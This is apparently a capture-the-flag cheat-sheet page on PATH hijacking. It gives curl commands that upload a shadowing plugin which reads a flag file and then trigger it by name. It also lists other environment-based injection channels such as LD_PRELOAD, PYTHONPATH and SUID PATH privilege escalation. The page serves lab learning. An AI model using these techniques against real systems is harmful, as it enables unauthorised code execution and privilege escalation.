# PATH hijack / command override via environment

**Idea**: commands run by **name** are resolved through `$PATH`, left to right. If you can write a
file into a directory that comes *before* the real one (or control `PATH`), your file runs instead
of the real tool. No metacharacter needed — the command line looks innocent.

**Signs**: "upload a plugin/script/tool", "custom tools are searched first", a runner that executes
named tools (`sysdiag`, `netcheck`); names are validated but **contents** aren't. Hint "bring your
own little tools… the first name it finds wins".

## Exploit
```bash
# 1. upload a plugin whose NAME equals a stock tool the runner calls
curl -s $T/plugins --data-urlencode 'name=sysdiag' --data-urlencode $'script=#!/bin/sh\ncat /flag/flag'
# 2. run the tool by name
curl -s -d 'tool=sysdiag' $T/run | grep -o 'flag{[^}]*}'
```
Make sure the shebang is on its own line (real `\n`, not the two characters `\` `n`).
List the stock tools first (UI dropdown, `/tools`, JS) and shadow one of them.

## Other environment channels
- `LD_PRELOAD=/tmp/x.so` (if you control env + can upload a .so)
- `BASH_ENV`, `ENV` (scripts sourced by non-interactive shells)
- `PYTHONPATH` / writable dir in `sys.path` → plant `json.py`, `os.py`…
- `NODE_OPTIONS=--require /tmp/x.js`
- Shellshock: env var values parsed as functions → [shellshock](shellshock.md)
- Privesc: SUID binary calling `system("ls")` → `PATH=/tmp:$PATH` → [privesc](../11-post-exploitation/privesc-basics.md)

Seen in: `inj10` (ToolDesk: runner does `PATH=/tmp/plugins:$PATH <tool>`).
